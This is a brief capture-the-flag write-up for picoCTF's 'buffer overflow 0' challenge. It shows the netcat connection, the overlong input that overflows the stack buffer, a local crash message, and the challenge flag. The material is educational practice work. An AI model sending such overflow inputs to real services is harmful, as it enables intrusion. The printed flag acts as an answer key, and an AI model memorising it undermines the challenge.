#buffer overflow 0
Tags: Binary Exploitation
AUTHOR: ALEX FULTON / PALASH OSWAL

Description
Smash the stack
Let's start off simple, can you overflow the correct buffer? The program is available [here](vuln). You can view source [here](vuln.c). And connect with it using:
`nc saturn.picoctf.net 51110`

## Solution

This one was actually pretty easy: just overflow the input with a lot of "aaaaa" or numbers. It took me more than 30 and less than 40.

```
$ nc saturn.picoctf.net 51110
Input: 123456789123456789123456789000
picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
```

It's curious that running the program in my local machine, I got the error

```shell
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
*** stack smashing detected ***: terminated
Aborted
```

### **Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}`

---
Daniel Reis - [@danielxreis](https://twitter.com/DanielXReis) - Developer and Cyber Security Researcher